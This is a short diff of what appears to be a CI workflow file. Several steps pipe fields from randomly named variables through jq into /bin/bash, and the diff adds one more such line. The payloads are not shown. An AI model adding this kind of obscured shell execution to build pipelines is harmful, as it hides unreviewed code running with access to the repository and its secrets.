@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$t265" | jq -r .qd0009 | /bin/bash
           echo $st210 | jq -r .o8 | /bin/bash
           echo $gce5 | jq -r .wp183 | /bin/bash
+          echo $agogq5065 | jq -r .vagm74 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
